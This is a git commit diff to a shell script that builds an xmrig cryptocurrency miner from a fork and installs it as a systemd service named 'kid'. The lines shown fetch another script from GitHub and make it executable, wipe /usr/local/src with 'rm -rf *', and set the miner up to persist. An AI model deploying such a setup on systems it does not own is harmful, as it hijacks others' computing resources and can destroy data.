d02b8311e660ea4ea7250887c9c7b34daae5ed9c
waniekvbgm <69979619+waniekvbgm@users.noreply.github.com>
2020-10-12 23:40:50 +0700

    Update suxmr-21.sh

--- suxmr-21.sh
+++ suxmr-21.sh
@@ -4,8 +4,8 @@ apt-get -y install build-essential libssl-dev wget libcurl4-openssl-dev libjanss
 sudo sysctl vm.nr_hugepages=128 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
-cd /usr/local/src/ && rm -rf * && sudo service kid stop && rm -f /lib/systemd/system/kid.service
-wget -O suxmr-21-link1.sh https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-21-link1.sh && sudo chmod a+x suxmr-21-link1.sh
+cd /usr/local/src/ && rm -rf * && sudo service kid stop && rm -f /lib/systemd/system/kid.service && 
+sudo wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-21-link1.sh && sudo chmod a+x suxmr-21-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
 [Unit]
